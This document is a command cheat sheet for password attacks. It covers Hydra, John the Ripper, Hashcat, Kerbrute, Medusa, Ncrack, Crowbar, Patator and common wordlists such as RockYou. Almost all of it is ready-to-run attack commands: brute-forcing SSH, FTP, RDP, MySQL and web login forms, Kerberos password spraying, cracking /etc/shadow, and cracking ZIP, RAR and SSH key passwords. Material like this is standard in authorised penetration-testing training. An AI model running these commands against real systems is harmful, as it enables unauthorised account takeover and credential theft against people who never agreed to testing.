# Password Attacks

_11 tool commands_

### Hydra  `hydra`
_Network login cracking tool_

**Step 0**
> Brute-force SSH using a username and password wordlist
_platform: linux_
```
hydra -l user -P wordlist.txt ssh://target_ip
```
**Syntax breakdown:**
- `hydra` — Hydra cracking tool _command_
- `-l` — specify username _parameter_
- `-L` — specify username wordlist file _parameter_
- `-p` — specify password _parameter_
- `-P` — specify password wordlist file _parameter_
- `ssh://` — target service protocol _value_

**Step 0**
> Brute-force an FTP service
_platform: linux_
```
hydra -L users.txt -P passwords.txt ftp://target_ip
```

**Step 0**
> Brute-force an HTTP form login
_platform: linux_
```
hydra -l admin -P wordlist.txt target_ip http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```
**Syntax breakdown:**
- `http-post-form` — HTTP POST form module _value_
- `^USER^` — username placeholder _value_
- `^PASS^` — password placeholder _value_
- `Invalid` — failure response marker _value_

**Step 0**
> Brute-force an RDP service
_platform: linux_
```
hydra -l administrator -P wordlist.txt rdp://target_ip
```

**Step 0**
> Brute-force a MySQL database
_platform: linux_
```
hydra -l root -P wordlist.txt mysql://target_ip
```

**Step 0**
> Specify thread count
_platform: linux_
```
hydra -t 4 -l user -P wordlist.txt ssh://target_ip
```
**Syntax breakdown:**
- `-t` — number of concurrent threads _parameter_

**Step 0**
> Resume a previously interrupted task
_platform: linux_
```
hydra -R
```
**Syntax breakdown:**
- `-R` — resume task _parameter_

---

### John the Ripper  `john`
_Password cracking tool_

**Step 0**
> Crack a hash using a wordlist
_platform: linux_
```
john --wordlist=wordlist.txt hash.txt
```
**Syntax breakdown:**
- `john` — John cracking tool _command_
- `--wordlist=` — specify wordlist file _parameter_

**Step 0**
> Specify hash format
_platform: linux_
```
john --wordlist=wordlist.txt --format=raw-md5 hash.txt
```
**Syntax breakdown:**
- `--format=` — specify hash format _parameter_

**Step 0**
> Show cracked passwords
_platform: linux_
```
john --show hash.txt
```
**Syntax breakdown:**
- `--show` — show results _parameter_

**Step 0**
> Crack a Linux password file
_platform: linux_
```
unshadow /etc/passwd /etc/shadow > mypasswd
john --wordlist=wordlist.txt mypasswd
```
**Syntax breakdown:**
- `unshadow` — merge passwd and shadow files _command_

**Step 0**
> Crack a ZIP file password
_platform: linux_
```
zip2john protected.zip > zip.hash
john --wordlist=wordlist.txt zip.hash
```
**Syntax breakdown:**
- `zip2john` — extract ZIP password hash _command_

**Step 0**
> Crack a RAR file password
_platform: linux_
```
rar2john protected.rar > rar.hash
john --wordlist=wordlist.txt rar.hash
```

**Step 0**
> Crack an SSH private key password
_platform: linux_
```
ssh2john id_rsa > ssh.hash
john --wordlist=wordlist.txt ssh.hash
```

**Step 0**
> Use brute-force mode
_platform: linux_
```
john --incremental hash.txt
```
**Syntax breakdown:**
- `--incremental` — brute-force mode _parameter_

---

### Hashcat  `hashcat`
_GPU-accelerated password cracking tool_

**Step 0**
> Crack an MD5 hash using a wordlist
_platform: linux_
```
hashcat -m 0 -a 0 hash.txt wordlist.txt
```
**Syntax breakdown:**
- `hashcat` — Hashcat cracking tool _command_
- `-m 0` — hash type (MD5) _parameter_
- `-a 0` — attack mode (dictionary attack) _parameter_

**Step 0**
> Brute-force mode
_platform: linux_
```
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a
```
**Syntax breakdown:**
- `-a 3` — brute-force mode _parameter_
- `?a` — all-characters mask _value_

**Step 0**
> Mask character set reference
```
?l = abcdefghijklmnopqrstuvwxyz
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d = 0123456789
?s = special characters
?a = all characters
?b = 0x00-0xff
```

**Step 0**
> Crack using a rule file
_platform: linux_
```
hashcat -m 0 -a 0 hash.txt wordlist.txt -r rules/best64.rule
```
**Syntax breakdown:**
- `-r` — specify rule file _parameter_

**Step 0**
> Combine two wordlists
_platform: linux_
```
hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt
```
**Syntax breakdown:**
- `-a 1` — combination attack mode _parameter_

**Step 0**
> Common hash type numbers
```
-m 0 = MD5
-m 100 = SHA1
-m 1400 = SHA256
-m 1700 = SHA512
-m 1000 = NTLM
-m 1800 = SHA512crypt
-m 3200 = bcrypt
-m 5600 = NetNTLMv2
-m 13100 = Kerberos TGS
```

**Step 0**
> Show cracked results
_platform: linux_
```
hashcat -m 0 hash.txt --show
```

**Step 0**
> Test GPU performance
_platform: linux_
```
hashcat -b
```

---

### Kerbrute  `kerbrute-tool`
_Kerberos brute-force tool_

**Step 0**
> Enumerate domain users
```
kerbrute userenum -d domain.com --dc dc_ip users.txt
```

**Step 0**
> Password spraying attack
```
kerbrute passwordspray -d domain.com --dc dc_ip users.txt Password123
```

**Step 0**
> Brute-force a user
```
kerbrute bruteuser -d domain.com --dc dc_ip wordlist.txt username
```

**Step 0**
> Validate credentials
```
kerbrute -d domain.com --dc dc_ip user:password
```

---

### Medusa  `medusa`
_Fast, parallel network login brute-force tool_

**Step 0**
> SSH password brute-force with 4 threads
```
medusa -h target_ip -u admin -P passwords.txt -M ssh -t 4
```
**Syntax breakdown:**
- `medusa` — parallel network login cracking tool _command_
- `-h` — target host _parameter_
- `-u` — username _parameter_
- `-P` — password wordlist file _parameter_
- `-M ssh` — specify protocol module _parameter_
- `-t 4` — number of concurrent threads _parameter_

**Step 0**
> RDP remote desktop password cracking
```
medusa -h target_ip -U users.txt -P passwords.txt -M rdp -t 2
```

**Step 0**
> FTP cracking (stop after finding a password)
```
medusa -h target_ip -U users.txt -P passwords.txt -M ftp -f
```

**Step 0**
> Batch host brute-forcing (5 in parallel)
```
medusa -H hosts.txt -U users.txt -P pass.txt -M ssh -t 3 -T 5
```

---

### Ncrack  `ncrack`
_High-speed network authentication cracking tool from the Nmap project_

**Step 0**
> SSH authentication brute-force
```
ncrack -vv -U users.txt -P passwords.txt ssh://target_ip
```
**Syntax breakdown:**
- `ncrack` — high-speed network authentication cracking tool _command_
- `-vv` — verbose output _parameter_
- `ssh://target_ip` — protocol://target format _value_

**Step 0**
> Crack multiple different services on multiple targets at once
```
ncrack -U users.txt -P pass.txt ssh://10.0.0.1 rdp://10.0.0.2 ftp://10.0.0.3
```

**Step 0**
> Import Nmap scan results directly for cracking
```
ncrack -iX nmap_scan.xml -U users.txt -P pass.txt
```

---

### Crowbar  `crowbar`
_Brute-force tool focused on RDP/VNC/SSH keys/OpenVPN_

**Step 0**
> RDP password brute-force (2 threads)
```
crowbar -b rdp -s target_ip/32 -u admin -C passwords.txt -n 2
```
**Syntax breakdown:**
- `-b rdp` — specify protocol type _parameter_
- `-s` — target IP/CIDR _parameter_
- `-n 2` — number of concurrent connections _parameter_

**Step 0**
> Try multiple SSH private keys for login
```
crowbar -b sshkey -s target_ip/32 -u root -k /path/to/keys/
```

**Step 0**
> VNC authentication brute-force
```
crowbar -b vnckey -s target_ip/32 -p password -k /path/to/keys/
```

---

### Patator  `patator`
_Multi-purpose modular brute-force tool supporting dozens of protocols_

**Step 0**
> SSH login brute-force
```
patator ssh_login host=target_ip user=FILE0 password=FILE1 0=users.txt 1=passwords.txt
```
**Syntax breakdown:**
- `ssh_login` — use the SSH login module _command_
- `FILE0/FILE1` — reference wordlist files (numbered 0 and 1) _variable_

**Step 0**
> HTTP login form brute-force
```
patator http_fuzz url="https://target.com/login" method=POST body="user=FILE0&pass=FILE1" 0=users.txt 1=pass.txt -x ignore:fgrep="Login failed"
```

**Step 0**
> FTP password brute-force
```
patator ftp_login host=target_ip user=admin password=FILE0 0=passwords.txt
```

---

### CrackStation  `crackstation`
_Online hash lookup and an offline massive wordlist_

**Step 0**
> Reverse-lookup a plaintext password from a hash online
```
# Visit https://crackstation.net
# Enter the hash value (supports MD5/SHA1/SHA256, etc.)
# Supports batch lookups (one hash per line)
```

**Step 0**
> Offline cracking using CrackStation's massive wordlist
```
# CrackStation wordlist (15GB+):
# https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
# Use together with hashcat:
hashcat -m 0 hashes.txt crackstation.txt
```

---

### SecLists wordlists  `seclists`
_Essential wordlist collection for security testers (directories, passwords, usernames, payloads, etc.)_

**Step 0**
> Common SecLists wordlist paths
_platform: linux_
```
# Directory wordlists:
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/common.txt

# Password wordlists:
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt

# Usernames:
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

**Step 0**
> Special-purpose wordlists (LFI/SQLi/subdomains/parameters)
_platform: linux_
```
# Fuzzing payloads:
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt

# Subdomains:
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Parameter names:
/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
```

---

### RockYou wordlist  `rockyou`
_Classic password wordlist from the 2009 RockYou data breach (14 million+)_

**Step 0**
> Decompress the rockyou wordlist bundled with Kali
_platform: linux_
```
gzip -d /usr/share/wordlists/rockyou.txt.gz
wc -l /usr/share/wordlists/rockyou.txt  # approximately 14,344,392 lines
```

**Step 0**
> Use together with various password cracking tools
```
# Hashcat:
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# John:
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Hydra:
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target
```

---

